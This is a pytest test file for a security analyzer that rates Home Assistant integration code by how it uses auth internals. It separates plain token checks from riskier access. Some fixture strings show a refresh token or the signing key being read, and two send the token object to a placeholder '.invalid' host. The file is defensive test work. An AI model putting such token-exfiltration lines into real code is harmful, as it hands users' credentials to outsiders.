"""(0.14.1, #21) Checking a login token sent to the app is not reaching into the auth store.
Made-up code, parsed only; planted hosts use .invalid."""

from __future__ import annotations

import textwrap
from pathlib import Path

import pytest

from sniff_test.analyzers import py_precision
from sniff_test.analyzers.py_resolve import Resolver
from sniff_test.models import Category, Finding, Severity

CHECKS = {
    # the result only tested for None
    "compare": "if hass.auth.async_validate_access_token(token) is None:\n    return 401",
    "not": "if not hass.auth.async_validate_access_token(token):\n    return 401",
    # kept in a name read only for whose token it is (HA's own signed-link check)
    "whose": (
        "rt = hass.auth.async_get_refresh_token(claims.get('iss'))\n"
        "if rt is None:\n    return False\n"
        "request['hass_user'] = rt.user\nrequest['hass_refresh_token_id'] = rt.id"
    ),
}
STAYS = {
    # the signing key or the token itself
    "jwt_key": "rt = hass.auth.async_get_refresh_token(i)\nkey = rt.jwt_key",
    "token": "rt = hass.auth.async_get_refresh_token(i)\nsend('https://x.invalid', rt.token)",
    # the object passed on, returned, or reassigned
    "passed": "rt = hass.auth.async_get_refresh_token(i)\nsend('https://x.invalid', rt)",
    "returned": "return hass.auth.async_get_refresh_token(i)",
    "reassigned": (
        "rt = hass.auth.async_get_refresh_token(i)\nrt = other\nif rt is None:\n    return"
    ),
    # another auth call: minting is never a check
    "mint": "t = hass.auth.async_create_access_token(rt)\nif t is None:\n    return",
}


def _finding(tmp_path: Path, body: str) -> tuple[Finding, Resolver]:
    code = "async def handler(hass, request, token, claims, i, other):\n" + textwrap.indent(
        body, "    "
    )
    (tmp_path / "views.py").write_text(code + "\n")
    line = next(n for n, text in enumerate(code.splitlines(), 1) if "hass.auth." in text)
    f = Finding(
        rule_id="ha-auth-internals",
        title="t",
        severity=Severity.HIGH,
        category=Category.SENSITIVE_ACCESS,
        message="m",
        file="views.py",
        line=line,
    )
    return f, Resolver(tmp_path)


@pytest.mark.parametrize("case", sorted(CHECKS))
def test_a_token_check_is_low_and_never_a_source(tmp_path, case):
    f, res = _finding(tmp_path, CHECKS[case])
    out = py_precision.token_check_only(f, res)
    assert out is not None and out.rule_id == "ha-auth-token-check"
    assert out.severity is Severity.LOW
    from sniff_test.analyzers.correlate import CREDENTIAL_SOURCES

    assert out.rule_id not in CREDENTIAL_SOURCES  # never paired into possible-exfil


@pytest.mark.parametrize("case", sorted(STAYS))
def test_anything_more_stays_high(tmp_path, case):
    f, res = _finding(tmp_path, STAYS[case])
    assert py_precision.token_check_only(f, res) is None
